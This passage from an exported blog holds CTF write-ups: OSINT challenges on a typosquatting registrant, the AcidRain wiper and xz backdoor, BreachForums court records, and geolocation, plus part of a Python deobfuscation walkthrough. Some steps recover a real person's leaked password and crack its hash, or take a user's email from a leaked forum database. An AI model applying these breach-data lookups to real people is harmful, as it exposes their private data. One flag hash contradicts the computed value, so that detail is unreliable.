    "imageUrl": "/assets/images/Write-Ups/victoris4_OSINT_finals/WHOIS.png",
    "content": "<h2><span style=\"color:#0056D2;\"><strong>Introduction</strong></span></h2>\n<p>After a full 6 hours in the <code>IEEE VICTORIS4 CTF</code> finals phase, I’m happy to share my write-up for three OSINT challenges I created: two Investigations (<em>Easy/Medium</em>) and one Geo (<em>Hard</em>).</p>\n<p>This is a step-by-step walkthrough aimed at beginners.  </p>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>Domains of Deception</strong></span></h2>\n<blockquote>\n<h3>Description</h3>\n<p>Whispers spread across the net: a phantom domain-smith forging shadows of giants.\nHis masterpiece? rnicrosoft[.]com — a false mirror of trust, luring the careless.\nOne careless step led hunters to his trail.</p>\n<p>Follow the traces. Unmask the trickster. Gather his secrets.</p>\n<h3>Flag parts:</h3>\n<p>⦁\tFirst part (scammer name): the scammer’s real full name.</p>\n<p>⦁\tSecond part (oldest domain): of the &gt;16,390 domains registered under the scammer’s name, identify the oldest domain registration (domain string only, e.g. example[.]com).</p>\n<p>⦁\tThird part (leaks): how many data leaks (leaked datasets) were found associated with the scammer’s accounts? (a numeric count)</p>\n<p><em><strong>Bounus: If you recover a password from the leaked data, submit it as an optional fourth Bounus token.</strong></em></p>\n<h3>Flag format:</h3>\n<p>IEEE{Real_Name,oldest.domain,Leakcount}</p>\n</blockquote>\n<p>First, we need the <code>Scammer&#39;s name</code> so we open <a href=\"https://www.whois.com/whois/rnicrosoft.com\">WHOIS Domain Lookup</a> and search with the domain name, now we know who is the Registrant a.k.a. <code>Scammer</code> and also some extra useful info about him.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/WHOIS.png\" alt=\"alt text\"></p>\n<p>Now, we know that he has over 16,390 domains registered under his name,\nwith that much records, if we went to <a href=\"https://whoisology.com/name/park%20hyungjin/1\">whoisology.com</a> and searched with the Registrant name <code>Park HyungJin</code>, we will get a partial list of records, but those records aren&#39;t in order and we will have to search for the Creation Date manually in all of them.</p>\n<p>After some search, we find this <a href=\"https://www.bigdomaindata.com/reverse-whois/\">website</a> that offers the full list with a price of <code>$25</code>, it also shows only 100 records without price as a free trial, so we clarify our search filter like this:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/Search-filter.png\" alt=\"alt text\"></p>\n<p>Now we get this result for the oldest 100 records:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/result.png\" alt=\"alt text\"></p>\n<p><em><strong>NOTE: You can also find it <a href=\"https://whoisfreaks.com/tools/user/whois/reverse/search/owner/park%20hyungjin?exact=true&page=4#open-modal-0\">here</a> but there is no guarantee the this is the oldest one, the records aren&#39;t in order</strong></em></p>\n<p>Last part, we need to find numeric count of leaks that his email appeared in , so we open <a href=\"https://haveibeenpwned.com/\">HIBP</a> and search with his email <code>b2c@naver.com</code>, the result is `4.</p>\n<p>For the Bounus part, we go to <a href=\"https://breachdirectory.org/\">BreachDirectory</a> and search for the email <code>b2c@naver.com</code>, we get this result:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/breachdirectory.png\" alt=\"alt text\"></p>\n<p>Now we already have the first password <code>1111</code>. To get the other one we open any hash cracker and select the <code>sha1</code> algorithm and we get the second password:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/hash-cracker.png\" alt=\"alt text\"></p>\n<p><em><strong>NOTE: you can also use this <a href=\"https://t.me/HaveIBeenHacked_Bot?start=BRqrTQe\">tg bot</a> made by <a href=\"https://www.linkedin.com/in/mohamedwagdy72/\">Kalawy</a> to get the passwords straightforward.</strong></em></p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{Park_HyungJin,wni.net,4}</strong></span></p>\n<p>Bounus: <span style=\"color:#0056D2;\"><strong>1111,379843aad2a2e3882c9c89a2f69ea2ddcc66bf55</strong></span></p>\n<hr>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>KA-SAT</strong></span></h2>\n<blockquote>\n<h3>Description</h3>\n<p>In the dawn fog before battle, a pure evil rose, an evil that will touch the sky, the <code>KA-SAT</code> had been compromised, What began as legitimate commands became a destructive wiper.</p>\n<p>Investigate this breach using your OSINT and Threat-Intel skills.</p>\n<hr>\n<h3>Flag Parts:</h3>\n<ol>\n<li>Consumer brand of the affected service.</li>\n<li>The group responsible for the attack.</li>\n<li>CRC32-b hash of the only string this wiper writes.</li>\n<li>CRC32-b hash of all 8 targeted paths within the binary (comma separated, in the same order within the binary).</li>\n</ol>\n<p><strong>NOTE:</strong> if the paths were: <code>/usr/bin/</code>, <code>/usr/sbin</code>, <code>/usr/tmp</code>, then the hash will be:</p>\n<blockquote>\n<p>CRC32(&quot;/usr/bin/,/usr/sbin,/usr/tmp&quot;)</p>\n</blockquote>\n<hr>\n<h3>Flag Format:</h3>\n<blockquote>\n<p>IEEE{name,group,string_crc32,paths_crc32}</p>\n</blockquote>\n</blockquote>\n<p>First, a simple search will bring us to the official <a href=\"https://www.viasat.com/perspectives/corporate/2022/ka-sat-network-cyber-attack-overview/\">incident report </a> from <code>Viasat</code>, the owner of the satellite, Now we know what was the incident.</p>\n<p>Within the report we find the Consumer brand of the affected service mentioned here:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/Tooway.png\" alt=\"alt text\"></p>\n<p>Now, we go to the <a href=\"https://attack.mitre.org/software/\">MITRE ATT&amp;CK</a> software page and search for the incident, we can find it here with the name of the group <code>SandWorm</code> and also the wiper name <code>AcidRain</code>.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/mitre-attack.png\" alt=\"alt text\"></p>\n<p>After knowing the wiper&#39;s name we can go to <a href=\"https://bazaar.abuse.ch/browse.php?search=tag%3AAcidRain\">Malware Bazaar</a> and search with the tag <code>AcidRain</code>, we see two samples, we download the oldest one matching the attack date and start analyzing.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/malware-bazaar.png\" alt=\"alt text\"></p>\n<p>Submitting the sample to <a href=\"https://www.joesandbox.com/analysis/601024/0/html#overview\">Joe Sandbox</a>, we can find the only string printed by searching the <code>Standard Output</code> field.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/output.png\" alt=\"alt text\"></p>\n<p>Using <a href=\"https://cyberchef.org/#recipe=CRC-32_Checksum()&input=TG9vayBvdXQh\">CyberChef</a> with CRC-32, we get our third part of the flag <code>3f2d5b79</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/first-hash.png\" alt=\"alt text\"></p>\n<p>For the last part, according to <a href=\"https://www.sentinelone.com/labs/acidrain-a-modem-wiper-rains-down-on-europe/\">Sentinel Labs</a> report, the targeted paths are hardcoded within the binary making it easy for an in-depth wipe of the filesystem and various known storage device files, so we only need to run <code>strings</code> on the binary to get them in order.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/strings.png\" alt=\"alt text\"></p>\n<p>Now we have them:</p>\n<ul>\n<li>/dev/loopXX</li>\n<li>/dev/sdXX</li>\n<li>/dev/mtdXX</li>\n<li>/dev/mtdblockXX</li>\n<li>/dev/block/mtdblockXX</li>\n<li>/dev/mmcblkXX</li>\n<li>/dev/block/mmcblkXX</li>\n</ul>\n<p><em><strong>NOTE: in the description, I asked for 8 targeted paths, there are only 7; I mistakenly counted <code>/dev/null</code> as a targeted path.</strong></em></p>\n<p>So now, we format them as the description said, and we get this hash <code>a05e040f</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/second-hash.png\" alt=\"alt text\"></p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{Tooway,Sandworm,be408ebe,a05e040f}</strong></span></p>\n<hr>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>Sport</strong></span></h2>\n<blockquote>\n<h3>Description</h3>\n<p>Nothing beats a good sports time. Find where I’m and the next match will be on me.\nProvide the coordinates of the place rounded to 3 decimal places.</p>\n<h3>Flag format: <em>IEEE{LAT,LON}</em></h3>\n<h3>Example: <em>IEEE{36.806,10.181}</em></h3>\n<hr>\n</blockquote>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/sports.png\" alt=\"alt text\"></p>\n<p>First with some image-searching and comparing similar images, the construction style strongly suggests this place is in <code>عين السبع بالمغرب</code>.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/A%C3%AFn-Seba%C3%A2.JPG\" alt=\"alt text\"></p>\n<p>We notice that there is a banner hanged on the playground wall&#39;s net, It has some Arabic words but we cann&#39;t read it clearly, this is a strong identication that Morocco is correct</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/1.png\" alt=\"alt text\"></p>\n<p>After some edit to the image and giving it to any AI agent, we can conclude that the phrase is <code>الفضاء الرياضي إقامة الشباب</code>, so we search on it on the maps and start search for any playgrounds in the found area till we find this:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_finals/maps.png\" alt=\"alt text\"></p>\n<p>Opening the street view, we get these two images:</p>\n<iframe src=\"https://www.google.com/maps/embed?pb=!4v1759230992978!6m8!1m7!1sCAoSFkNJSE0wb2dLRUlDQWdJQzQycFdfSFE.!2m2!1d33.60667539097235!2d-7.522787284210762!3f63.10109864196937!4f20.212630032879858!5f0.4000000000000002\" width=\"600\" height=\"450\" style=\"border:0;\" allowfullscreen=\"\" loading=\"lazy\" referrerpolicy=\"no-referrer-when-downgrade\"></iframe>\n\n\n<iframe src=\"https://www.google.com/maps/embed?pb=!4v1759231019372!6m8!1m7!1sCAoSFkNJSE0wb2dLRUlDQWdJRHEtYnZpWXc.!2m2!1d33.60642747184831!2d-7.522331432069667!3f306.56927924820957!4f5.681927935590636!5f0.7820865974627469\" width=\"600\" height=\"450\" style=\"border:0;\" allowfullscreen=\"\" loading=\"lazy\" referrerpolicy=\"no-referrer-when-downgrade\"></iframe>\n\n<p>This is our place.</p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{33.607,-7.523}</strong></span></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#0056D2;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/victoris4-quals-osint",
    "slug": "victoris4-quals-osint",
    "title": "OSINT Writeup — IEEE VICTORIS4 CTF Quals",
    "description": "After a full 24 hours in the `IEEE VICTORIS4 CTF` qualifications phase, I’m happy to share my write-up for three OSINT challenges I created: two Investigations (*Easy/Medium*) and one Geo (*Hard*), this is a step-by-step walkthrough aimed at beginners.",
    "date": "September 21, 2025",
    "readTime": "8 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/Write-Ups/victoris4_OSINT_Quals/github-commit.png",
    "content": "<h2><span style=\"color:#0056D2;\"><strong>Introduction</strong></span></h2>\n<p>After a full 24 hours in the <code>IEEE VICTORIS4 CTF</code> qualifications phase, I’m happy to share my write-up for three OSINT challenges I created: two Investigations (<em>Easy/Medium</em>) and one Geo (<em>Hard</em>).</p>\n<p>This is a step-by-step walkthrough aimed at beginners.  </p>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>The Phantom Maintainer</strong></span></h2>\n<h3>Description</h3>\n<pre><code class=\"language-txt\">30 milliseconds.\nThat’s all it took for a curious researcher to realize something wasn’t right.\nHis SSH connections on a Debian Sid box felt… heavy, CPU usage spiked without reason, A memory debugger whispered errors no one had ever seen before.\nFrom that tiny anomaly unraveled one of the largest supply-chain compromises the open-source world has faced in years.\nSomewhere inside the project’s commits hides a phantom maintainer — a name without a past, a presence without a trace.\nHe wasn’t alone. Two more voices echoed alongside his, applying pressure, pushing changes, steering trust.\n\nYour task:\nFollow the crumbs.\nFind the project.\nUnmask the rogue.\nName his allies.\nFlag parts\nThe co-maintainer’s full name → fname-mname-lname\nThe date of his first commit → mm/dd/yyyy\nThe names of two teammates who aided the pressure campaign → fname-lname,fname-lname\nFlag format\nIEEE{fname-mname-lname,mm/dd/yyyy,fname-lname,fname-lname}\n\nExample:\nIf the maintainer was John Middle Doe, with first commit on 01/01/2020, and teammates Alice Smith and Bob Brown:\n\nIEEE{John-Middle-Doe,01/01/2020,Alice-Smith,Bob-Brown}\n</code></pre>\n<p>First we search for the name of the target project and after some researching we can be sure that it&#39;s XZ Utils incident, so we start searching for the maintainers of the project.</p>\n<p>On the official GitHub repository, we can see this commit in the <code>AUTHORS</code> file under the name <code>Add Jia Tan to AUTHORS.</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/github-commit.png\" alt=\"alt text\"></p>\n<p>So, now we know that there is another maintainer (Author) than the original <code>Lasse Collin</code>, his name is <code>Jia Tan</code>, but we need his full name, so searching any commits archive like <a href=\"https://git.tukaani.org/\">git.tukaani.org</a>, by searching all <code>Jia Tan</code>&#39;s commits, we see a different name at <code>2022-12-30</code> with the name <code>Jia Cheong Tan</code>, &#39;Cheong&#39; is a name often used in Cantonese, but &#39;Jia&#39; is rarely used in Cantonese. For this reason, we speculates that &quot;the name &#39;Jia Cheong Tan&#39; is just a plausible combination of Chinese-sounding names.&quot;</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/full-name.png\" alt=\"alt text\"></p>\n<p><em><strong>Full name: Jia-Cheong-Tan</strong></em></p>\n<p>Now, we have the full name, let&#39;s get to the date of his first commit,\nI opened the <a href=\"https://www.mail-archive.com/xz-devel@tukaani.org/\">Mail Archive</a> to see xz-devel mailing list, and start searching for <code>Jia Tan</code>&#39;s first comment, and it was no more than a very simple editor config file introduction. </p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/date-of-first-commit.png\" alt=\"alt text\"></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/content-of-first-commit.png\" alt=\"alt text\"> </p>\n<p><em><strong>Date: 10/29/2021</strong></em></p>\n<p>Last, we go for his teammates, Getting back to the xz-devel mailing list, It&#39;s clear that over the summer of 2022 Lasse Collin got interest pressured to add a maintainer, two of them was very exposing, and they both were address to <code>Jigar Kumar</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/mail-2.png\" alt=\"alt text\"> </p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/mail-1.png\" alt=\"alt text\"></p>\n<p>Another one this <code>Dennis Ens</code>, he also tried to pressure <code>Lasse Collin</code> to add a new maintainer, he even mentioned <code>Jia Tan</code> personally.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/mail-3.png\" alt=\"alt text\"></p>\n<p><em><strong>Teammates: Dennis-Ens &amp; Jigar-Kumar</strong></em></p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{Jia-Cheong-Tan,10/29/2021,Dennis-Ens,Jigar-Kumar}</strong></span></p>\n<hr>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>Ugly Inside — The Leak Trace</strong></span></h2>\n<h3>Description</h3>\n<pre><code>There once was an underground Telegram channel named &quot;ugly inside and out&quot;, infamous for dragging secrets out of the shadows. On &quot;20 Jan 2024, 01:25&quot;, the channel published a message about the arrest of an administrator of a dark-web forum. That message itself was a forward from another group.\n\nIn that second group, look for the &quot;Rule 5(c)(3) Affidavit&quot; related to the arrest. Inside the affidavit you will find the name of the FBI case agent who led the arrest. This will be the first part of your flag.\n\nWithin the same affidavit you will also discover the alias used by this administrator. Search for a certain Bitcoin wallet address that is connected to this alias. That wallet address will be the second part of your flag.\n\nFinally, where you uncover the wallet address, you will also find a request for this admin to middleman a transaction. Investigate the buyer: this individual always used Tor with a VPN. Extract the VPN email address they relied on. That will be the third part of your flag.\n\nFlag Format\nIEEE{&lt;agent_name&gt;,&lt;btc_address&gt;,&lt;vpn_email&gt;}\n\nExample:\nIEEE{John_Doe,1Aa2Bb3Cc...,vpnuser@example.com}\n</code></pre>\n<p>First, we have a Telegram channel named <code>ugly inside and out</code>, so we start with any Telegram analytics platform like the <a href=\"https://tgstat.com/channel/@explain\">TGStat Services</a>, and search for our channel.</p>\n<p>We can&#39;t open the channel on Telegram because it had been deleted, but we still can read some of its messages, we filter the messages with our date and here is the desired message:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/msg-1.png\" alt=\"alt text\"></p>\n<p>Now, we have the name <code>Conor Fitzpatrick</code>and a second group <code>vx-underground</code>, so we open the second group on Telegram and start investigating <code>Conor Fitzpatrick</code>.</p>\n<p>In the group, you can see a link for the <a href=\"https://storage.courtlistener.com/recap/gov.uscourts.nysd.595805/gov.uscourts.nysd.595805.1.0.pdf\">Rule 5(c)(3) Affidavit</a> of this <code>Conor Fitzpatrick</code>.</p>\n<p>by opening it, we know even more than we need:</p>\n<ul>\n<li><p><code>Conor Fitzpatrick</code> is the admin we seek for.</p>\n</li>\n<li><p>His alias is <code>pompompurin</code></p>\n</li>\n<li><p>The Forum is <code>BreachForums</code></p>\n</li>\n<li><p>The FBI case agent is <code>John Longmire</code></p>\n</li>\n</ul>\n<p>With all what we have, we now can go to the the case file on <a href=\"https://www.justice.gov/usao-edva/united-states-v-conor-brian-fitzpatrick\">United States\nAttorney&#39;s Office</a> and get the Court Documents\n mainly the <a href=\"https://www.justice.gov/usao-edva/file/1300536/dl?inline\">Criminal Complaint</a>.</p>\n<p>In the Criminal Complaint, we can see details of <code>pompompurin</code> middlemanning a deal between an FBI OCE and a forum-user named <code>expo2020</code>, <code>pompompurin</code> had given the OCE his wallet address which is what we need </p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/wallet.png\" alt=\"alt text\"></p>\n<p>Wallet address: <em><strong>bc1q24gp83glmeh3kgfn23zs7l8l2nhnu6m8xllcvd</strong></em></p>\n<p>Now, we need more info about the OCE, we know that the deal was on <code>BreachForums</code> with <code>expo2020</code>, so we go to <a href=\"https://bf.based.re/\">BF Database Search</a> and search about <code>expo2020</code>.</p>\n<p>Within his DMs, we see <code>pompompurin</code> telling him about the deletion of his thread because a rule violation, the thread was about selling the same data that our OCE bought, which tells us we are getting to right person</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/Thread-removed.png\" alt=\"alt text\"></p>\n<p>later, we see another DM message from someone asking about the same data, and <code>expo2020</code> replied with <code>yes, written in tg</code>, the username was <code>cr4ck4</code>.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/first-contact.png\" alt=\"alt text\"></p>\n<p>This could be our OCE, so we search his profile and DMs and see him replying to the same <code>pompompurin</code> message that was within the <code>Criminal Complaint</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/confirm-deal.png\" alt=\"alt text\"></p>\n<p>So, now we are sure that the OCE name is <code>Cr4ck4</code>, getting his vpn email is easy since we have his leaked profile data, just get to his <code>basic_info</code> section and you have his vpn email.</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/vpn-mail.png\" alt=\"alt text\"></p>\n<p>Now, we have the three parts of the flag.</p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{John_Longmire,bc1q24gp83glmeh3kgfn23zs7l8l2nhnu6m8xllcvd,<a href=\"mailto:cr4ck4@protonmail.com\">cr4ck4@protonmail.com</a>}</strong></span></p>\n<hr>\n<hr>\n<h2><span style=\"color:#0056D2;\"><strong>Frozen Yard</strong></span></h2>\n<h3>Description</h3>\n<pre><code>The cold wind cuts across an empty plain, where rusting machines and scattered containers sleep under a blanket of snow — a lonely workshop standing against the wide horizon.\n\nThe challenge is simple: Find out exactly where this photograph was taken, Submit the coordinates of this location up to three decimal places\n\nExample: IEEE{30.089, 31.318}\n</code></pre>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/map.png\" alt=\"alt text\"></p>\n<p>In this image, we have two clues:</p>\n<ol>\n<li>Characteristics of the place says that it&#39;s on <code>Alaska’s North Slope</code></li>\n<li>The interesting building with numbers on the right.</li>\n</ol>\n<p>By image-searching we see an exact match of the building, it belongs to <code>CONAM Construction Company</code></p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/image-search.png\" alt=\"alt text\"></p>\n<p>Visiting their History page on their <a href=\"https://www.conamco.com/about-us/history\">Official Website</a>, we see this info</p>\n<blockquote>\n<p>In Alaska,  CONAM has enjoyed partnerships with Alaska Native Companies including CIRI, AHTNA, Tikigaq Corporation of Point Hope, KIC of Kotzebue, Kuukpik Corporation of Nuiqsut, and AMES1, LLC.</p>\n</blockquote>\n<p>Now, we know that their project in Alaska is within <code>Point Hope</code>, so we go to our google maps and take a look on that place</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/Point-Hope.png\" alt=\"alt text\"></p>\n<p>Using Street View, we search inch-by-inch till we see this:</p>\n<p><img src=\"/assets/images/Write-Ups/victoris4_OSINT_Quals/street-view.png\" alt=\"alt text\"></p>\n<p>Flag: <span style=\"color:#0056D2;\"><strong>IEEE{68.347,-166.745}</strong></span></p>\n<hr>\n<hr>\n<p align=\"center\"><span style=\"color:#0056D2;\">THE END</span></p>\n\n\n<hr>\n<hr>\n"
  },
  {
    "id": "/post/ctfcit_reverse",
    "slug": "ctfcit_reverse",
    "title": "CTF@CIT_REV",
    "description": "Write-up for 2 Reverse challenges from the annual World-Wide CTF@CIT.",
    "date": "April 30, 2025",
    "readTime": "7 min read",
    "tags": [
      "CTF"
    ],
    "category": "CTF Writeups",
    "imageUrl": "/assets/images/Write-Ups/CTF@CIT2025/team.png",
    "content": "<h1><strong>CTF@CIT!</strong></h1>\n<p>Hello Everyone!<br>\nI recently participated in the CTF@CIT, which was a really fun experience, and I managed to secure the 18th place with my team <code>L0ck8y7e</code> among other 950 teams around the world, As for me, I solved 11 challenges distributed among <code>MISC</code>, <code>Steganography</code>, <code>OSINT</code> and <code>Reverse</code>.</p>\n<p>In this Write-up, I&#39;ll continue in the reverse side.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/team.png\" alt=\"Team_rank\"></p>\n<h1>Read Only</h1>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Read_Only_image.png\" alt=\"Read_Only_image\"></p>\n<p>This is very straightforward, as the name says, all we need to do is to read the strings, I used the <code>strings</code> command and piped it to <code>grep</code> to extract the flag in one step, and <strong>Voilà</strong>, here is our flag.</p>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/strings.png\" alt=\"Strings\"></p>\n<p>Flag: <span style=\"color:#00FFFF;\"><strong>CIT{87z1BjG1968G}</strong></span></p>\n<hr>\n<h1>Serpent</h1>\n<p><img src=\"/assets/images/Write-Ups/CTF@CIT2025/Serpent_image.png\" alt=\"alt text\"></p>\n<p>This file is a full obfuscated Python code that uses dumb names for its variables and functions and has lots of tricky math and character combinations, so let us take it step by step deobfuscating this script manually</p>\n<p><em><strong>You can use AI of course — but where’s the fun in that?</strong></em></p>\n<h2>Simplify math</h2>\n<p>There are lots of very long math computations in the script, but in fact, each one represents only a constant, here is an example:</p>\n<pre><code class=\"language-py\">llllIlIlllIl = int(llIlIllIlIII[:int(((((116704136061.60963/964.3201898193925)/(0.428703923838846*886.9237724388992))/((0.0012060833880980187*881.8443963774392)*(130182.98979848581/481.8732951395559)))/(((29522.745228631833/649.7570061320558)/(1.4324981093115086*335.8825456577037))*((0.0017319883848935607*805.3839972167189)*(3.356677032714075*156.57728970259043)))))], int(((((5390772.534752933/864.0296058875497)/(26.83148167401528*27.364792970405322))/((0.0005708733226711018*740.6357840296969)*(102.92500351553784*9.678895359212218)))*(((14416.339800419119/546.3940490550166)*(0.6100297608738964*928.6839910352614))/((42.6015599384457*363.2887585003947)/(63167.78456455019/76.92378917865454))))))\n</code></pre>\n<p>After calculating the two equations, the code will be:</p>\n<pre><code class=\"language-py\">llllIlIlllIl = int(llIlIllIlIII[:16], 16)\n</code></pre>\n<p>Now, we can apply this to the entire code to make it more simple.</p>\n<h2>Renaming dummy names</h2>\n<p>Now, we have 6 functions and a class, the first one is:</p>\n<pre><code class=\"language-py\">def IlIIIlIIIIIlI(llIIIlIIlIIll: str) -&gt; int:\n    llIlIllIlIII = hashlib.sha256(llIIIlIIlIIll.encode()).hexdigest()\n    llllIlIlllIl = int(llIlIllIlIII[:16], 16)\n    IlIlIIlIlII = ((llllIlIlllIl &gt;&gt; 3) ^ 0x5F5F5F5F) % 0xFFFFFFFF\n    return IlIlIIlIlII\n</code></pre>\n<p>This function takes a string as input and returns a deterministic pseudo-random 32-bit integer based on that string, so we can re write it as :</p>\n<pre><code class=\"language-py\">def generate_seed(input_str: str) -&gt; int:\n    hash_hex = hashlib.sha256(input_str.encode()).hexdigest()\n    first_16_chars = int(hash_hex[:16], 16)\n    number = ((first_16_chars &gt;&gt; 3) ^ 0x5F5F5F5F) % 0xFFFFFFFF\n    return number\n</code></pre>\n<p>Next we have the following function:</p>\n<pre><code class=\"language-py\">def IIllIIIllIIlIIIIlIl(value: int, IIIllIIllllIII: int) -&gt; int:\n    if IIIllIIllllIII &lt;= 0:\n        return value\n    llIllIIllIIlII = ((value * 7 ) ^ (value &gt;&gt; 2)) &amp; 0xFFFFFFFF\n    return IIllIIIllIIlIIIIlIl(llIllIIllIIlII + IIIllIIllllIII, IIIllIIllllIII - 1)\n</code></pre>\n<p>This function Recursively transforms the input value by applying a custom formula for a specified number of iterations, so we can rewrite it as:</p>\n<pre><code class=\"language-py\">def recursive_transform(value: int, iterations : int) -&gt; int:\n    if iterations  &lt;= 0:\n        return value\n    transformed_value  = ((value * 7) ^ (value &gt;&gt; 2)) &amp; 0xFFFFFFFF\n    return recursive_transform(transformed_value  + iterations , iterations  - 1)\n</code></pre>\n<p>Now we have a class that contains 4 functions:</p>\n<pre><code class=\"language-py\">class Transformer:\n    def __init__(self, lIllIlIIIlIII: int):\n        self.lIllIlIIIlIII = lIllIlIIIlIII\n    def lIIllllIIllI(self) -&gt; str:\n        lIllIIIlIlIIlIlIlII = math.sin(self.lIllIlIIIlIII % 360)\n        IIlIlIlIIlIIlI = f&quot;{abs(int(lIllIIIlIlIIlIlIlII * 10000)):08d}&quot;\n        return IIlIlIlIIlIIlI\n    def IIIlIIlIIlIl(self, IIIllIIlII: str) -&gt; str:\n        lIIllIIlIllIll = 42\n        IIIlIIIlllIIlII = &quot;&quot;.join(chr((ord(c) ^ lIIllIIlIllIll) &amp; 0xFF) for c in IIIllIIlII)\n        IllllIIllIIl = base64.b64encode(IIIlIIIlllIIlII.encode()).decode()\n        return IllllIIllIIl\n    def IlIIIllIlIlIlI(self, IllllIIllIIl: str) -&gt; int:\n        IIIIIIlIlIllII = hashlib.md5(IllllIIllIIl.encode())\n        lIlIlllllIllI = IIIIIIlIlIllII.hexdigest()\n        return int(lIlIlllllIllI[:8], 16)\n</code></pre>\n<p>This transformer applies a series of transformations to an integer input:</p>\n<ol>\n<li>Converts it using the sine function.</li>\n<li>Applies XOR encoding and Base64 encoding.</li>\n<li>Hashes the result with MD5 and extracts a portion of it.</li>\n</ol>\n<p>So, the clean version of it could be like this:</p>\n<pre><code class=\"language-py\">class Transformer:\n    def __init__(self, value: int):\n        self.value = value\n    def transform_step1(self) -&gt; str:\n        sine_value  = math.sin(self.value % 360)\n        scaled_value  = f&quot;{abs(int(sine_value  * 100000000)):08d}&quot;\n        return scaled_value \n    def transform_base64_encoded(self, step1: str) -&gt; str:\n        xor_key  = 42\n        xor_encoded = &quot;&quot;.join(chr((ord(c) ^ xor_key ) &amp; 0xFF) for c in step1)\n        base64_encoded = base64.b64encode(xor_encoded.encode()).decode()\n        return base64_encoded\n    def transform_step3(self, base64_encoded: str) -&gt; int:\n        md5_hash  = hashlib.md5(base64_encoded.encode())\n        hex_digest = md5_hash .hexdigest()\n        return int(hex_digest[:8], 16)\n</code></pre>\n<p>After the class, we have another 4 functions, this is the first:</p>\n<pre><code class=\"language-py\">def IIllIllIIIIIIlIl(values: list) -&gt; str:\n    IlIlIIllIl = sum(values)\n    IlIlIIllIl ^= 0xABCDEF\n    lIlIIIlllIIIllIII = 0\n    for digit in str(IlIlIIllIl):\n        lIlIIIlllIIIllIII = (lIlIIIlllIIIllIII * 31 + int(digit)) &amp; 0xFFFFFFFF\n    IlIlIIlIIIlllIl = hex(lIlIIIlllIIIllIII)[2:]\n    lllIllIIlI = base64.b64encode(IlIlIIlIIIlllIl.encode())\n    IlIIIIlIlIIll = lllIllIIlI.decode()[:16]\n    IlIIIIlIlIIll = IlIIIIlIlIIll.rjust(16, chr(48))\n    return IlIIIIlIlIIll\n</code></pre>\n<p>This code sums the list, applies XOR, performs a custom hash-like transformation, encodes the result with Base64, and formats it to a 16-character string, so we can rewrite it as:</p>\n<pre><code class=\"language-py\">def generate_final_token(values: list) -&gt; str:\n    total  = sum(values)\n    total  ^= 0xABCDEF\n    hashed_value  = 0\n    for digit in str(total ):\n        hashed_value  = (hashed_value  * 31 + int(digit)) &amp; 0xFFFFFFFF\n    hex_str = hex(hashed_value )[2:]\n    base64_encoded = base64.b64encode(hex_str.encode())\n    final_token  = base64_encoded.decode()[:16]\n    final_token  = final_token.rjust(16, chr(48))\n    return final_token \n</code></pre>\n<p>Then we have these 2 functions:</p>\n<pre><code class=\"language-py\">def lIllIlIIlIlllllIllll() -&gt; str:\n    llIIIlIIlIIll = &quot;S3cr3tS33d_For_CTFC0mp&quot;\n    llIIllIIll = IlIIIlIIIIIlI(llIIIlIIlIIll)\n    llIIlIllIIllIIIIll = IIllIIIllIIlIIIIlIl(llIIllIIll, IIIllIIllllIII=10)\n    llIIIIIIlIIllll = Transformer(llIIlIllIIllIIIIll)\n    IIIllIIlII = llIIIIIIlIIllll.lIIllllIIllI()\n  